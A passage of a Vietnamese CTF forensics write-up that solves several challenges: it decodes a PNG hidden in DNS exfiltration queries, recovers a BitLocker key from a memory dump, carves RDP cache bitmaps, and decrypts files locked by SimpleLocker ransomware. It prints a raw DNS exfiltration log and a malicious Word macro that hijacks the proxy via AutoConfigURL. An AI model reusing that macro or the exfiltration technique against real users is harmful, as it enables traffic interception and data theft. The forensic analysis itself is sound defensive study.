177b01241025f8e374ef8d37de88b7df7e7b1c376e5cecdab56bdafc0ffc.38be231c0626c61877efde9d4cd7ab57af46cd275b8f8f6cbd0398fae268.f4e8d14dde8337f5cd80871e7ac8137c0b7220689aacaaaa2a3cfae8a38d.bedca38f3e5ae320b713264c484effe52f7f.jz-n-bs.local
47bb012410265be3746991e5fde637bf999c7ee38d375a7dbc962f5f1e6e.bef9e61a7f9f3a756af8e0830fdca13a80638e3926395d5e5e9e71ba356b.d624a78f3efae8836e9c366dda949ceeddbbf781c79ecdf8539721438684.2baeb8223cfdf4d3e1e38f3f0edffdee7793.jz-n-bs.local
724e01241026bee374f5d075d75d9736ede9a79f9ef6b8cbe4d5575f4d4e.8f1c39b24dc7acb2b2b24dfeef71c71d979c5ebd7a7593e7937af0e965cb.9685f3ce3baf49d72975dd7cf6d9675be9b4200148933df5d45361ebd6ad.218410060d1a14aaabab33aed8abababc3a0.jz-n-bs.local
17280124102721e3744183420821fcf7bfff0d4f3df5548d15f6d8b16343.0821ac5ab5aa4522b05fbf7ec9e91d3b76b4ea58eddab52b5c7cf1c5a1ba.ba3a8410427171711213dbb66d0b3ff8c10f92f33aa2dcdcdce474b6ae47.5da1505b3064fa7b3697edeb5fff7a727af1.jz-n-bs.local
2af30124102784e374e2c519a75bb87061727afffdfa60923a36a79e7a6a.d6e75f585818eeb8e38ee4f7a54b97667c41396fdebc8cf3493d6fe2c489.ad3e4ea9df0c74e49147b6c9e363dcb871c9e9871f7eb8c9d7e5e28b2f0e.b366cd4a7e2f2d2d0d175c7041a3bfd1e6b3.jz-n-bs.local
059101241027e7e374cf3eab759d4d0bf026a88f809b7af94cc7fecb24f5.00bae79f7f7e8df3df7efbedd8b367cfe4186bb56ddbd3dc650f6df45dc0.3ffef18f9379f4e8d123fee73fff89afbcf24adaf63737de786387fd0838.75279efa8eeb97cdebd290796573d9528f03.jz-n-bs.local
71b4012410284ae374d8a3478ff8fefbefd79866eddab5c9372ad4771cc0.2fe247c06bd6ac89858585c9fc1e7becb11659e677de79276d5bb1039d73.ce39c9f9b51d8878debc79c9f9e3c68d6b93f14c3d10fc4f7ffad33659b7.6fdebc39edb8957ffffbdf9b35ff993367a6.jz-n-bs.local
774901241028ade374fd7dd2a4498d3a1450b0d3876d0069df0158d7b1ff.3259bb766dda763bb5ededfbecb3cf260712cdc9c989175c70415cb46851.dcb06143dcb3674fdcbd7b777cefbdf7e25ffffad7386edcb80e1180cf3c.f34cda3ceebffffee4bc9b6eba296d6781a5.jz-n-bs.local
583a0124102910e3744b9776c8009c34695272fe65975d16376dda947107.8fd60ec06c2f5bea0b99418306c579f3e6c5eddbb7c7eddbb7c7b973e7c6.238f3cb2c1df04d2110370d8b061f1a69b6e8a2fbcf042dcb87163dcb367.4facacac8c6bd6ac8937df7c73f2222e8410.jz-n-bs.local
1cab0124102973e3744b4a4a9ab55c279f7c72fccd6f7e135f7cf1c5b865.cb96585555152b2a2ae2b3cf3e9bb633556ddb1597959525dfc093979717.efbdf7de585151112b2a2ae2bdf7de9b444f414141b30e59d2d8f1dcb973.675cb66c59bcf0c20bd30e885edb01a15b6b.jz-n-bs.local
544801241029d6e374ddbe7f8fe2fdebe69ffffce7f1dffffe77dcbd7b77.dcb56b572c2b2b6bf03781c458735be7c99327d7b9c397001480b483000c.0ddc80b8be63ff65525c5c9c5ceeb6db6eab759a37df7c336d43e0fa7ece.38e38cf8e28b2fb64a0086466e645d515191.jz-n-bs.local
3f8b0124102a39e374f60ed4811b9a575757c7b3ce3a2b39ffe8a38fae75.e7826cac1443330e665ddfff5fb16245dab11c439676cac8c6ed99ed65ab.aeae4e3b2074c8f05dc03366cca8f7bb80dbea49305bf785ba7e2eb9e492.5abfd73adbcb3976ecd88c3b1c3cf7dc7369.jz-n-bs.local
35c80124102a9ce374878439f0e7b0c30e6bf43755647b7c8b8a8a321e0f.b3355fdc3ff4d04369476b68eee3e5aaabae4a3bfff2cb2f178002902f42.00d677ecbf4ceebbefbe7a8f09b85f6969699c366d5a1c316244ecdbb76f.cccdcd8df9f9f971d0a04171dcb871f1d7bf.jz-n-bs.local
61d00124102affe374fe757cf3cd371b755d53bf7da3a1df38d29c004c7d.95dfaf5fbf5abf1a6bfdfaf5694f52b57dfd577b0fc018ffff5e9a975e7a.693cfef8e3635e5e5eda31bcda32005b6ad95e7bedb578e9a597c62f7ff9.cbb17bf7eeb17bf7eef12b5ff94a9c32654a.jz-n-bs.local
78b80124102b62e3745cb16245b396b93d07607979799c3973661c3f7e7c.3ce6986362f7eedd63972e5d62efdebde369a79d16a74d9b56eba19e9ae2.adb7de8ab7dc724b3cf7dc73e397bef4a5d8b56bd7e43b874b4a4ae2a38f.3e5aef3b4b1f7ffc719c3163463cf1c41363.jz-n-bs.local
489d0124102bc5e3744141412c282888279e78629c316346dcb87163ab8f.6fb76edde2800103e2b9e79e1befbaebae3abfe5a2b53fddd9b46953bcfe.faebe3a851a362efdebd63e7ce9d63cf9e3de3881123e295575e195f7df5.d546cdff473ffa51da34bffce52febfcff95.jz-n-bs.local
30950124102c28e37495954dfabe769a26e7ff6e44382814151585f5ebd7.277b9b0d1932c4a000b403656565c93ab9a8a828ac5bb7cea0b4207b0173.50292e2e4e4ecf98312394959585bd7bf71a18803652555515cacbcbc335.d75c93fc6dcc983106a68579079083cabffe.jz-n-bs.local
11940124102c8be374f5af3066cc98b07bf7ee1ae7792800b47284fcdfb1.035375efde3d2c5dba349c72ca2906480042f6ac59b326cc9a352b2c5dba.34ac5bb72eecd8b1235455550940803608c0dcdcdcd0a3478f505454148a.8b8bc34f7ef2933078f06083230001d8ff64.jz-n-bs.local
0e5d0124102ceee374d91456f3c6180e641b40008083edc58e770001000e.2ede01040010800000084000000420000002100000010800800004004000.020020000100108000000840000004200000021000000108002000010010.800000084000000420000002100000010800.jz-n-bs.local
581c0124102d51e374800004004000020020000100108000000840000004.200000021000000108002000010010800000084000000420000002100000.010800800004004000020020000100108000000840000004200000021000.400002002000010010800000084000000420.jz-n-bs.local
033f0124102db4e374000002100000010800800004004000020020000100.108000000840000004200000021000400002002000010010800000084000.000420000002100000010800800004004000020020000100108000000840.000004200080000400400002002000010010.jz-n-bs.local
4eae0124102e17e374800000084000000420000002100000010800800004.004000020020000100108000000840000004200080000400400002002000.010010800000084000000420000002100000010800800004004000020020.000100108000000840000004200080000400.jz-n-bs.local
11880124102e7ae374400002002000010010800000084000000420000002.100000010800800004004000020020000100108000000840000001080080.000400400002002000010010800000084000000420000002100000010800.800004004000020020000100108000000840.jz-n-bs.local
14930124102edde374000001080080000400400002002000010010800000.084000000420000002100000010800800004004000020020000100108000.000210000001080080000400400002002000010010800000084000000420.000002100000010800800004004000020020.jz-n-bs.local
4a7b0124102f40e374000100108000000210000001080080000400400002.002000010010800000084000000420000002100000010800800004004000.02002000010004a021000010800000084000000420000002100000010800.800004004000020020000100108000000840.jz-n-bs.local
0a9b0124102fa3e374000004200000021000000108002000010010800000.084000000420000002100000010800800004004000020020000100108000.000840000004200000021000000108002000010010800000084000000420.000002100000010800800004004000020020.jz-n-bs.local
130e0124103006e374000100108000000840000004200000021000400002.002000010010800000084000000420000002100000010800800004004000.020020000100108000000840000004200000021000400002002000010010.800000084000000420000002100000010800.jz-n-bs.local
09b50124103069e374800004004000020020000100108000000840000004.200080000400400002002000010010800000084000000420000002100000.010800800004004000020020000100108000000840000004200080000400.e060f0ff004931172f17c25a180000000049.jz-n-bs.local
62c101241030cce374454e44ae426082.jz-n-bs.local
347301241030d3e374.jz-n-bs.local
171101241030d3e374.jz-n-bs.local
38d801241030d3e374.jz-n-bs.local
7b3201241030d3e374.jz-n-bs.local
4a0a01241030d3e374.jz-n-bs.local
```

Để ý ở mỗi bản ghi thì 9 byte đầu là mã id phiên ví dụ ```
6c0601241015bae374``` và bản ghi thứ 3 có các byte ```89 50 4e 47 0d ```, đây là các byte đầu của một ảnh ```png```

Giờ sẽ cắt đi 9 byte đầu và tên miền ```jz-n-bs.local``` của mỗi bản ghi sẽ được toàn bộ byte của một ảnh ```png``` hoản chỉnh

```python
with open("dns.txt", "r") as f:
    lines = f.readlines()

result = ""

for line in lines:
    line = line.strip()
    if not line.endswith("jz-n-bs.local"):
        continue

    domain = line.split(".jz-n-bs.local")[0]

    cleaned = domain.replace(".", "")

    if len(cleaned) > 18:
        cleaned = cleaned[18:]
    else:
        cleaned = ''

    result += cleaned
    
print(result)
```

![image](/assets/data/21.png)

Bỏ đi các byte thừa ở đầu ta sẽ được 1 ảnh ```png``` hoản chỉnh

![image](/assets/data/22.png)


## Job interview

![image](/assets/data/24.png)

Trước một tập tin không xác định,sử dụng file !

```
file image_forensic.e01
image_forensic.e01: EWF/Expert Witness/EnCase image file format
```
Sử dụng bộ công cụ sleuth kit nhưng không thành công, fls báo đó là một file tar

```
fls image_forensic.e01
Unsupported image type (Tar Archive)
```

Sử dụng ```ewfxport``` để chuyển sang ```raw```

```
ewfexport image_forensic.e01
ewfexport 20140816

Information for export required, please provide the necessary input
Export to format (raw, files, ewf, smart, ftk, encase1, encase2, encase3, encase4, encase5, encase6, encase7, encase7-v2, linen5, linen6, linen7, ewfx) [raw]: raw
Target path and filename without extension or - for stdout:
Target is required, please try again or terminate using Ctrl^C.
Target path and filename without extension or - for stdout:
Target is required, please try again or terminate using Ctrl^C.
Target path and filename without extension or - for stdout:
Target is required, please try again or terminate using Ctrl^C.
Target path and filename without extension or - for stdout: for1
Evidence segment file size in bytes (0 is unlimited) (0 B <= value <= 7.9 EiB) [0 B]:
Start export at offset (0 <= value <= 9431040) [0]:
Number of bytes to export (0 <= value <= 9431040) [9431040]:

Export started at: Jun 28, 2025 23:25:18
This could take a while.

Export completed at: Jun 28, 2025 23:25:18

Written: 8.9 MiB (9431040 bytes) in 0 second(s).
MD5 hash calculated over data:          ba74f9213ff89221eb9b68cd03ff0242
ewfexport: SUCCESS
```
Dùng file xác định đây đúng là file ```tar``` giải nén ta được file ```bcache24.bmc```

Bây giờ tôi có một tệp BMC. Với mẹo trong ghi chú và một số tìm kiếm trên web, tôi thấy rằng đây là tệp chứa bitmap để lưu trữ đệm RDP. Tôi tìm kiếm trước và tìm thấy công cụ này:

https://github.com/ANSSI-FR/bmc-tools 

```
 python3 bmc-tools.py -s ../bcache24.bmc -d ../output -v
[+++] Processing a single file: '../bcache24.bmc'.
[+++] Processing a file: '../bcache24.bmc'.
[===] Successfully loaded '../bcache24.bmc' as a .BMC container.
[+++] 100 tiles successfully extracted so far.
[+++] 200 tiles successfully extracted so far.
[+++] 300 tiles successfully extracted so far.
[+++] 400 tiles successfully extracted so far.
[+++] 500 tiles successfully extracted so far.
[===] 575 tiles successfully extracted in the end.
[===] Successfully exported 575 files.

```
Giải ra được 575 file :)) mở ở dạng biểu tượng, một số bitmap sẽ chứa flag

## Second job interview

![image](/assets/data/25.png)

Tương tự như lần 1 ta dùng ```ewfexport``` sau đó giải nén ```tar``` ta được 2 file ```image.dd``` và ```memory.dmp```

Thử dùng sleuth kit để phân tích ```image.dd``` nhưng đã bị mã hóa ```bitlocker```

```
mmls image.dd
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000000127   0000000128   Unallocated
002:  000:000   0000000128   0000147583   0000147456   NTFS / exFAT (0x07)
003:  -------   0000147584   0000153599   0000006016   Unallocated
```
```
fls -o 128 image.dd
Encryption detected (BitLocker)
```

Dùng ```volatility``` Để phân tích bộ nhớ ram, dùng plugin bilocker để tìm key giải mã

```
 volatility -f memory.dmp --profile=Win7SP1x64 bitlocker
Volatility Foundation Volatility Framework 2.6.1

[FVEK] Address : 0xfa80018be720
[FVEK] Cipher  : AES 128-bit with Diffuser
[FVEK] FVEK    : e7e576581fe26aa7c71a7e711c778da2
[FVEK] Tweak   : b72f4e075edb7e734dfb08638cf29652

```
Oke giờ thì chỉ cần dùng gắn ổ địa bitlocker để giải mã thôi có thể dùng ```bdemount```

```
 sudo bdemount -k [FVEK]:[TWEAK] -o $((512*[start_partition]])) image.dd /tmp/
```

```
sudo bdemount -k e7e576581fe26aa7c71a7e711c778da2:b72f4e075edb7e734dfb08638cf29652 -o 65536 image.dd /mnt/bitlocker
```
```
sudo ls /mnt/bitlocker

bde1
```
Giờ thì dùng sleuthkit để xem tất cả các file trong phân vùng bde1

```
r/r 44-128-1:   flag.jpg
```
```
icat bde1 44-128-1 > flag.jpg
```
DONE

## Malicious Word macro

![image](/assets/data/26.png)

Dùng ```volatility``` để phân tích file bộ nhớ ```memory.dmp``` 

```
volatility -f memory.dmp imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/minhtuan/Documents/Cyber_Security/CTFs/RootMe/ch20/memory.dmp)
                      PAE type : No PAE
                           DTB : 0x185000L
                          KDBG : 0x82953c28L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82954c00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2016-11-11 16:14:49 UTC+0000
     Image local date and time : 2016-11-11 17:14:49 +0100
```

Dùng plugin ```pslist``` để liệt kê tất cả các tiến trình thì thấy ```WINWORD.EXE``` đang chạy

```
volatility -f memory.dmp --profile=Win7SP1x86_23418 pslist
....
0x84d24490 WINWORD.EXE            3248    816     13      434      1      0 2016-11-11 16:14:05 UTC+0000                         
0x84f8a868 OSPPSVC.EXE            3340    456      5      127      0      0 2016-11-11 16:14:09 UTC+0000                         
0x84f6bd40 iexplore.exe           3388    816     20      444      1      0 2016-11-11 16:14:13 UTC+0000                         
0x84d6e390 iexplore.exe           3476   3388     27      698      1      0 2016-11-11 16:14:14 UTC+0000 
```
Dùng plugin ```cmdline``` để trích xuất dòng lệnh (command line) mà một tiến trình đã chạy trong bộ nhớ dump

```
volatility -f memory.dmp --profile=Win7SP1x86_23418 cmdline
....
WINWORD.EXE pid:   3248
Command line : "C:\Program Files\Microsoft Office\Office15\WINWORD.EXE" /n "C:\Users\fraf\Downloads\Very_sexy.docm
```

Ta thấy ```WINWORD.EXE``` đã mở file ```Very_sexy.docm```, giờ dùng plugin ```filescan``` để tìm kiếm file ```Very_sexy.docm``` sau đó kéo về để phân tích

```
volatility -f memory.dmp --profile=Win7SP1x86_23418 filescan | grep "Very_sexy.docm"

Volatility Foundation Volatility Framework 2.6.1
0x000000000eec5988      2      1 RW-r-- \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
0x000000000f3ee038      8      0 RW-r-- \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
```
```
volatility -f memory.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000000eec5988 -D output

Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x0eec5988   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
SharedCacheMap 0x0eec5988   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
```

```
volatility -f memory.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000000f3ee038 -D output

Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x0f3ee038   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
SharedCacheMap 0x0f3ee038   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
```

Vì đây là file word có chứa macro nên ta sẽ dùng ```olevba``` để phân tích macro của file docx này

```
olevba file.None.0x84cb24e8.dat
olevba 0.60.2 on Python 2.7.18 - http://decalage.info/python/oletools
===============================================================================
FILE: file.None.0x84cb24e8.dat
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
    Dim myWS As Object
    Set myWS = CreateObject("WScript.Shell")
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL", "http://192.168.0.19:8080/BenNon.prox", "REG_SZ"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\MigrateProxy", 1, "REG_DWORD"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable", 0, "REG_DWORD"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EnableAutodial", 0, "REG_DWORD"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\NoNetAutodial", 0, "REG_DWORD"
    Selection.TypeText Text:="Et bim !!!!"
    Selection.MoveLeft Unit:=wdWord, Count:=3, Extend:=wdExtend
    Selection.Font.Size = 72
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |http://192.168.0.19:|URL                                          |
|          |8080/BenNon.prox    |                                             |
|IOC       |192.168.0.19        |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

WARNING  /home/minhtuan/.local/lib/python2.7/site-packages/msoffcrypto/method/ecma376_agile.py:8: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
```

Ta có thể thấy macro này có chứa hành vi chạy tự động nhờ AutoOpen, sau khi mở file docx này thì khi vào bất kì trang web nào cũng được gửi yêu cầu đến http://192.168.0.19:8080/BenNon.prox Nhận lại script JavaScript để quyết định có đi tiếp không tùy thuộc vào rule được cấu hình ở ```BenNon.prox``` có hàm chuẩn ```PAC``` file như này 

```javascript
function FindProxyForURL(url, host) {
  if (shExpMatch(host, "*youtube.com*")) return "PROXY 127.0.0.1:9999";
  return "DIRECT
```

Giờ thì ta quay lại file ```memory.dmp``` dùng plugin ```yarascan``` để tìm kiếm chuỗi kiểu hex, ta có thể tìm theo cấu trúc tên hàm ```FindProxyForURL``` hoặc ip ```192.168.0.19``` để biết trang web bị chặn

```
volatility -f memory.dmp --profile=Win7SP1x86_23418 yarascan -Y "FindProxyForURL"
Owner: Process svchost.exe Pid 1012
0x01e7000e  46 69 6e 64 50 72 6f 78 79 46 6f 72 55 52 4c 28   FindProxyForURL(
0x01e7001e  75 72 6c 2c 20 68 6f 73 74 29 0a 7b 0a 09 69 66   url,.host).{..if
0x01e7002e  20 28 73 68 45 78 70 4d 61 74 63 68 28 75 72 6c   .(shExpMatch(url
0x01e7003e  2c 22 2a 2e 61 73 68 6c 65 79 6d 61 64 69 73 6f   ,"*.ashleymadiso
0x01e7004e  6e 2e 63 6f 6d 2f 2a 22 29 29 0a 09 7b 0a 09 09   n.com/*"))..{...
0x01e7005e  72 65 74 75 72 6e 20 22 50 52 4f 58 59 20 31 39   return."PROXY.19
0x01e7006e  32 2e 31 36 38 2e 30 2e 31 39 3a 38 30 38 30 22   2.168.0.19:8080"
0x01e7007e  3b 0a 09 7d 0a 20 20 20 20 72 65 74 75 72 6e 20   ;..}.....return.
0x01e7008e  22 44 49 52 45 43 54 22 3b 0a 7d 00 00 00 00 00   "DIRECT";.}.....
0x01e7009e  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01e700ae  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01e700be  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01e700ce  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01e700de  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01e700ee  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01e700fe  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
```
```javascript
function FindProxyForURL(url, host)
{
    if (shExpMatch(url,"*.ashleymadison.com/*"))
    {
        return "PROXY 192.168.0.19:8080";
    }
    return "DIRECT";
}

```
Trang web bị chặn có tên miền là ```ashleymadison.com```

## Ransomware Android
![image](/assets/data/27.png)

Đây là một file sao lưu một phần hệ thống Android bị dính Ransomware cần khôi phục để lấy tài liệu bị mã hóa bới mã độc tống tiền

```
 ls app
org.simplelocker-1.apk
```
Ta có file APK: ```org.simplelocker-1.apk``` trong thư mục app. Đây là một ứng dụng Android hoàn chỉnh, và theo tên thì rất có thể là SimpleLocker — một loại mã độc Android thuộc dòng ransomware rất nổi tiếng

Ta sẽ dùng ```d2j-dex2jar``` để chuyển file ```org.simplelocker-1.apk``` sang ```java``` để phân tích logic của nó

```
d2j-dex2jar app/org.simplelocker-1.apk -o target.jar
dex2jar app/org.simplelocker-1.apk -> target.jar
```

Ta sẽ mở file java này bằng ```Java Decompler``` để phân tích

![image](/assets/data/28.png)
Đầu tiên, chúng ta muốn kiểm tra lớp ```AesCrypt``` , được hiển thị đầy đủ bên dưới:

```java!
package org.simplelocker;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.security.spec.AlgorithmParameterSpec;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AesCrypt {
  private final Cipher cipher;
  
  private final SecretKeySpec key;
  
  private AlgorithmParameterSpec spec;
  
  public AesCrypt(String paramString) throws Exception {
    MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
    messageDigest.update(paramString.getBytes("UTF-8"));
    byte[] arrayOfByte = new byte[32];
    System.arraycopy(messageDigest.digest(), 0, arrayOfByte, 0, arrayOfByte.length);
    this.cipher = Cipher.getInstance("AES/CBC/PKCS7Padding");
    this.key = new SecretKeySpec(arrayOfByte, "AES");
    this.spec = getIV();
  }
  
  public void decrypt(String paramString1, String paramString2) throws Exception {
    FileInputStream fileInputStream = new FileInputStream(paramString1);
    FileOutputStream fileOutputStream = new FileOutputStream(paramString2);
    this.cipher.init(2, this.key, this.spec);
    CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, this.cipher);
    byte[] arrayOfByte = new byte[8];
    while (true) {
      int i = cipherInputStream.read(arrayOfByte);
      if (i == -1) {
        fileOutputStream.flush();
        fileOutputStream.close();
        cipherInputStream.close();
        return;
      } 
      fileOutputStream.write(arrayOfByte, 0, i);
    } 
  }
  
  public void encrypt(String paramString1, String paramString2) throws Exception {
    FileInputStream fileInputStream = new FileInputStream(paramString1);
    FileOutputStream fileOutputStream = new FileOutputStream(paramString2);
    this.cipher.init(1, this.key, this.spec);
    CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, this.cipher);
    byte[] arrayOfByte = new byte[8];
    while (true) {
      int i = fileInputStream.read(arrayOfByte);
      if (i == -1) {
        cipherOutputStream.flush();
        cipherOutputStream.close();
        fileInputStream.close();
        return;
      } 
      cipherOutputStream.write(arrayOfByte, 0, i);
    } 
  }
  
  public AlgorithmParameterSpec getIV() {
    return new IvParameterSpec(new byte[16]);
  }
}
```
Chúng ta có thể thấy phương thức ```decrypt()``` được cung cấp rõ ràng trong lớp này. Chúng ta cũng đã biết mật khẩu giải mã (được đặt trong lớp ```Constants``` ), vì vậy tất cả những gì chúng ta cần là gọi phương thức này trên bất kỳ tệp nào có đuôi là .enc

Hãy tạo một lớp Java mới có tên là ```SimplelockerAntidote``` với phương thức có tên là ```getEncryptedFiles()``` sẽ quét thư mục hiện tại để tìm tất cả các tệp có đuôi là .enc

```java
public static String[] getEncryptedFiles() {
 
        File dir = new File(System.getProperty("user.dir"));
 
        Collection<String> files  =new ArrayList<String>();
 
        if(dir.isDirectory()){
            File[] listFiles = dir.listFiles();
 
            for(File file : listFiles){
                String filename = file.getName();
                if(
                    file.isFile() 
                    && (filename.lastIndexOf(".") >= 0)
                    && (filename.substring(filename.lastIndexOf(".")).toLowerCase().equals(".enc"))
                ) {
                    files.add(file.getName());
                }
            }
        }
         
        return files.toArray(new String[]{});
    }
```
Phương pháp này trả về một mảng các tên tệp String (của tất cả các tệp có đuôi .enc trong thư mục hiện tại) mà sau đó chúng ta có thể đưa vào phương thức decrypt() . Dòng 3 thiết lập thư mục hiện tại (nơi chương trình Java đang chạy). Dòng 10 lặp lại tất cả các tệp trong thư mục. Cuối cùng, dòng 15 kiểm tra xem tệp hiện tại có đuôi .enc không, trong đó dòng 17 thêm nó vào mảng trả về nếu nó khớp.

Tiếp theo, tạo phương thức chính gọi getEncryptedFiles() và đặt mật khẩu giải mã:

```java
public static void main(String[] args) throws Exception{
 
    // set default cipher password
    String cipher_password = "mcsTnTld1dDn";
 
    // overwrite cipher password if set by first argument
    if(args.length == 1)
    {
        cipher_password = args[0];
    }
 
    // create new SimplelockerAntidote object
    SimplelockerAntidote sa = new SimplelockerAntidote(cipher_password);
 
    // get array of filenames to decrypt from current directory
    String[] files = sa.getEncryptedFiles();
 
    // iterate through files in the array
    for (int i = 0; i < files.length; i++) {
 
        // set input and output filenames
        // and remove the .enc file extension
        String inputFilename = files[i];            
        String outputFilename = inputFilename.substring(0,inputFilename.length()-4);
 
        System.out.println("Decrypting "+outputFilename);
 
        // call decrypt on the current file
        sa.decrypt(inputFilename,outputFilename);
    }
 
    System.out.println("Decryption complete.");
 
}
    
```
Bây giờ tất cả những gì chúng ta cần làm là sao chép và dán phương thức xây dựng từ AesCrypt cùng với AlgorithmParameterSpec ```getIV()``` , ```encrypt()``` và ```decrypt()``` 

Đây là full source code

```java
// Simplelocker antidote, written by Simon Bell, SecureHoney.net

import javax.crypto.*;
import javax.crypto.interfaces.*;
import javax.crypto.spec.*;
import java.io.*;
import java.security.*;
import java.security.cert.*;
import java.security.interfaces.*;
import java.security.spec.*;
import javax.xml.bind.DatatypeConverter;
import java.util.ArrayList;
import java.util.Collection;

public class SimplelockerAntidote {

	private final Cipher cipher;
	private final SecretKeySpec key;
	private AlgorithmParameterSpec spec;

	public SimplelockerAntidote(String password) throws Exception {

		MessageDigest digest = MessageDigest.getInstance("SHA-256");
		digest.update(password.getBytes("UTF-8"));
		byte[] keyBytes = new byte[32];
		System.arraycopy(digest.digest(), 0, keyBytes, 0, keyBytes.length);

		cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		key = new SecretKeySpec(keyBytes, "AES");
		spec = getIV();
	}

	public AlgorithmParameterSpec getIV() {
		return new IvParameterSpec(new byte[16]);
	}

	public void encrypt(String paramString1, String paramString2) throws Exception {
		FileInputStream localFileInputStream = new FileInputStream(paramString1);
		FileOutputStream localFileOutputStream = new FileOutputStream(paramString2);
		this.cipher.init(1, this.key, this.spec);
		CipherOutputStream localCipherOutputStream = new CipherOutputStream(localFileOutputStream, this.cipher);
		byte[] arrayOfByte = new byte[8];
		while (true) {
			int i = localFileInputStream.read(arrayOfByte);
			if (i == -1) {
				localCipherOutputStream.flush();
				localCipherOutputStream.close();
				localFileInputStream.close();
				return;
			}
			localCipherOutputStream.write(arrayOfByte, 0, i);
		}
	}

	public void decrypt(String paramString1, String paramString2) throws Exception {
		FileInputStream localFileInputStream = new FileInputStream(paramString1);
		FileOutputStream localFileOutputStream = new FileOutputStream(paramString2);
		this.cipher.init(2, this.key, this.spec);
		CipherInputStream localCipherInputStream = new CipherInputStream(localFileInputStream, this.cipher);
		byte[] arrayOfByte = new byte[8];
		while (true) {
			int i = localCipherInputStream.read(arrayOfByte);
			if (i == -1) {
				localFileOutputStream.flush();
				localFileOutputStream.close();
				localCipherInputStream.close();
				return;
			}
			localFileOutputStream.write(arrayOfByte, 0, i);
		}
	} 

	public static String[] getEncryptedFiles() {

		File dir = new File(System.getProperty("user.dir"));

		Collection<String> files  =new ArrayList<String>();

		if(dir.isDirectory()){
			File[] listFiles = dir.listFiles();

			for(File file : listFiles){
				String filename = file.getName();
				if(
					file.isFile() 
					&& (filename.lastIndexOf(".") >= 0)
					&& (filename.substring(filename.lastIndexOf(".")).toLowerCase().equals(".enc"))
				) {
					files.add(file.getName());
				}
			}
		}
		
		return files.toArray(new String[]{});
	}

	public static void main(String[] args) throws Exception{

		// set default cipher password
		String cipher_password = "mcsTnTld1dDn";

		// overwrite cipher password if set by first argument
		if(args.length == 1)
		{
			cipher_password = args[0];
		}

		// create new SimplelockerAntidote object
		SimplelockerAntidote sa = new SimplelockerAntidote(cipher_password);

		// get array of filenames to decrypt from current directory
		String[] files = sa.getEncryptedFiles();

		// iterate through files in the array
		for (int i = 0; i < files.length; i++) {

			// set input and output filenames
			// and remove the .enc file extension
			String inputFilename = files[i];			
			String outputFilename = inputFilename.substring(0,inputFilename.length()-4);

			System.out.println("Decrypting "+outputFilename);

			// call decrypt on the current file
			sa.decrypt(inputFilename,outputFilename);
		}

		System.out.println("Decryption complete.");

	}
```
File bị mã hóa ```Confidentiel.jpg.enc``` ở thư mục media, Giờ ta sẽ chạy code java để giải mã ta sẽ được flag

```
javac -cp jaxb-api.jar SimplelockerAntidote.java
```
```
java -cp .:jaxb-api.jar SimplelockerAntidote mcsTnTld1dDn
Decrypting Confidentiel.jpg
Decryption complete.
```